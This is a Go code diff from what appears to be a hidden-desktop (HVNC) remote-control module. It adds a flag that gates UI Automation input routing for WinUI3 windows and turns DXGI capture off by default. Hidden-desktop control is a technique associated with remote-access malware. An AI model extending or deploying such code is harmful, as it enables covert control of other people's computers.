@@ -1082,7 +1082,7 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 			procSetFocus.Call(hitHwnd)
 		}
 
-		if isWinUI3Window(hitHwnd) {
+		if hvncUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
 			uiaHandleDragMove(pt)
 			uiaHandleMouseMove(hitHwnd, pt)
 			return nil
@@ -1111,7 +1111,7 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 	}
 
 	// WinUI3 branch: route through UIA patterns
-	if isWinUI3Window(hitHwnd) {
+	if hvncUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
 		return uiaHandleMouseButton(hitHwnd, pt, button, down)
 	}
 
@@ -1233,7 +1233,7 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 	}
 	updateModifierState(vk, down)
 
-	if isWinUI3Window(hwnd) {
+	if hvncUIAEnabled.Load() && isWinUI3Window(hwnd) {
 		if isModifierVK(vk) {
 			return nil
 		}
@@ -1506,7 +1506,7 @@ func hvncMouseWheelOnThread(delta int32) error {
 		}
 	}
 
-	if isWinUI3Window(hwnd) {
+	if hvncUIAEnabled.Load() && isWinUI3Window(hwnd) {
 		return uiaHandleMouseWheel(hwnd, pt, delta)
 	}
 
@@ -1704,9 +1704,11 @@ func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
 var dxgiFrameBuf []byte
 
 var hvncDXGIEnabled atomic.Bool
+var hvncUIAEnabled atomic.Bool
 
 func init() {
-	hvncDXGIEnabled.Store(true) // enabled by default
+	hvncDXGIEnabled.Store(false) // disabled by default
+	hvncUIAEnabled.Store(false)  // disabled by default
 }
 
 func SetHVNCDXGIEnabled(enabled bool) {
@@ -1715,6 +1717,14 @@ func SetHVNCDXGIEnabled(enabled bool) {
 
 func GetHVNCDXGIEnabled() bool {
 	return hvncDXGIEnabled.Load()
+}
+
+func SetHVNCUIAEnabled(enabled bool) {
+	hvncUIAEnabled.Store(enabled)
+}
+
+func GetHVNCUIAEnabled() bool {
+	return hvncUIAEnabled.Load()
 }
 
 func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
